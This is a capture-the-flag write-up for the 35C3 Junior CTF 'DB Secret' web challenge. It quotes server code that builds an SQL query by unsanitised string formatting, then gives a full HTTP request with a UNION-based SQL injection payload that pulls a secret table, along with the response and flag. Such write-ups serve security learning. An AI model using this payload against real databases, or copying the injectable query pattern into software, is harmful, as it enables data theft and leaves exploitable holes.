# 35C3 Junior CTF – DB Secret

* **Category:** Web
* **Points:** 89 (variable)

## Challenge

> To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.
>
> http://35.207.189.79/
>
> Difficulty Estimate: Medium
>
> ===============================================
>
> Good coders should learn one new language every year.
>
> InfoSec folks are even used to learn one new language for every new problem they face (YMMV).
>
> If you have not picked up a new challenge in 2018, you're in for a treat.
>
> We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.
>
> Some cool Projects can be created in Wee, like: this, this and that.
>
> Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.
>
> Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).
>
> We even added new features to this better server, like server-side Wee evaluation!
>
> To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` some interesting snippets can be discovered.

The vulnerable functionality is the following, because the query contains parameters replaced and not sanitized.

```Python
@app.route("/api/getprojectsadmin", methods=["POST"])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
    name = request.cookies["name"]
    token = request.cookies["token"]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json["offset"]
    sorting = json["sorting"]

    if name != "admin":
        raise Exception("InvalidUserName")

    sortings = {
        "newest": "created DESC",
        "oldest": "created ASC",
        "lastmodified": "lastModified DESC"
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
        "ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")
```

To obtain the `token` value, a login with `admin` user must be performed. The `token` will be set into the cookies. The login can be performed like in the [Logged In challenge](https://github.com/m3ssap0/CTF-Writeups/tree/master/35C3%20Junior%20CTF/Logged%20In).

The `DB_SECRET` variable, with the flag, is stored in another table that can be discovered in the following function.

```Python
def init_db():
    with app.app_context():
        db = get_db()
        with open(MIGRATION_PATH, "r") as f:
            db.cursor().executescript(f.read())
        db.execute("CREATE TABLE `secrets`(`id` INTEGER PRIMARY KEY AUTOINCREMENT, `secret` varchar(255) NOT NULL)")
        db.execute("INSERT INTO secrets(secret) values(?)", (DB_SECRET,))
        db.commit()
```

At this point a SQL injection payload can be crafted and sent to the server. The complete request with SQL injection payload is the following.

```
POST http://35.207.189.79/api/getprojectsadmin HTTP/1.1
Accept-Encoding: gzip,deflate
Cookie: token=menuknmgxhnnhbckbdspzaommgyiecsz; name=admin; logged_in=35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS
Content-Type: application/json
Content-Length: 141
Host: 35.207.189.79
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

{
	"offset" : "2018-12-25 00:00:00' UNION SELECT NULL, secret, NULL, NULL, NULL, NULL, NULL, NULL FROM secrets ---", 
	"sorting" : "newest"
}
```

The answer will be the following.

```
HTTP/1.1 200 OK
Server: nginx/1.13.12
Date: Sat, 29 Dec 2018 19:44:52 GMT
Content-Type: application/json
Content-Length: 187
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Security-Policy: script-src 'self' 'unsafe-inline';
Referrer-Policy: no-referrer-when-downgrade
Feature-Policy: geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; fullscreen *; payment 'self';

[{"code":null,"content":null,"created":null,"lastModified":null,"public":null,"title":null,"type":null,"userName":"35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???"}]
```

So, the flag is the following.

```
35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???
```